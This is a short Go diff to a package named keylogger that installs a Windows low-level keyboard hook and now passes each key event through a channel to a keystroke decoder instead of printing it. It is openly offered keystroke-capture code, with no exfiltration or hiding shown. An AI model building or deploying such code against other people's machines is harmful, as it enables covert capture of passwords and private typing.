@@ -1,9 +1,6 @@
 package keylogger
 
 import (
-	"fmt"
-	"unsafe"
-
 	"github.com/Spriithy/gkl/user32"
 	"github.com/Spriithy/gkl/wintypes"
 )
@@ -16,10 +13,15 @@ var whKeyStateNames = map[wintypes.WPARAM]string{
 }
 
 type KeyLogger struct {
+	Decoder *KeyStrokeDecoder
+	input   chan KeyboardEvent
 }
 
-func NewKeylogger() *KeyLogger {
-	return &KeyLogger{}
+func NewKeylogger(output chan string) *KeyLogger {
+	kl := &KeyLogger{}
+	kl.input = make(chan KeyboardEvent)
+	kl.Decoder = NewKeyStrokeDecoder(kl.input, output)
+	return kl
 }
 
 func (kl *KeyLogger) Start() {
@@ -30,8 +32,7 @@ func (kl *KeyLogger) Start() {
 }
 
 func (kl *KeyLogger) hook(nCode int, wParam wintypes.WPARAM, lParam wintypes.LPARAM) wintypes.LRESULT {
-	kbd := (*wintypes.KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))
-	key := byte(kbd.VkCode)
-	fmt.Printf("%-10s: %q\n", whKeyStateNames[wParam], key)
+	//kbd := (*wintypes.KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))
+	kl.input <- KeyboardEvent{wParam, lParam}
 	return user32.CallNextHookEx(0, nCode, wParam, lParam)
 }
